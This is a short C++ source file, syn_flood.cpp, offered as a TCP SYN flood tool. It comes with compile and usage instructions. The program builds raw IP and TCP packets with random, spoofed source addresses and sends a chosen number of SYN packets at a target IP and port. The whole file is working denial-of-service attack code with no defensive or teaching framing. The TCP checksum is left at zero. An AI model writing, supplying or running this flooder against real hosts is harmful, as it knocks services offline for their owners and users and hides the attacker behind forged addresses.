// ============================================================
// syn_flood.cpp — TCP SYN flood with spoofed source
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o syn_flood syn_flood.cpp
// Usage:   sudo ./syn_flood <target_ip> <port> <count>
// ============================================================
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <random>

static uint16_t csum(const void* data, int len) {
    const uint16_t* p = (const uint16_t*)data;
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t*)p;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

int main(int argc, char** argv) {
    if (argc < 4) { std::printf("usage: %s <ip> <port> <count>\n", argv[0]); return 1; }
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) { perror("socket"); return 1; }
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(std::atoi(argv[2]));
    inet_pton(AF_INET, argv[1], &dst.sin_addr);

    std::mt19937 rng{std::random_device{}()};
    int count = std::atoi(argv[3]);

    for (int i = 0; i < count; i++) {
        char buf[4096] = {0};
        auto* ip = (iphdr*)buf;
        auto* tcp = (tcphdr*)(buf + sizeof(iphdr));

        uint32_t src = rng();
        ip->version = 4; ip->ihl = 5; ip->tot_len = htons(40);
        ip->id = htons(rng() & 0xffff);
        ip->ttl = 64; ip->protocol = IPPROTO_TCP;
        ip->saddr = src;
        ip->daddr = dst.sin_addr.s_addr;
        ip->check = csum(ip, sizeof(iphdr));

        tcp->source = htons(rng() & 0xffff);
        tcp->dest = dst.sin_port;
        tcp->seq = rng();
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);
        tcp->check = 0;

        sendto(s, buf, 40, 0, (sockaddr*)&dst, sizeof(dst));
    }
    std::printf("[+] sent %d SYNs\n", count);
    return 0;
}
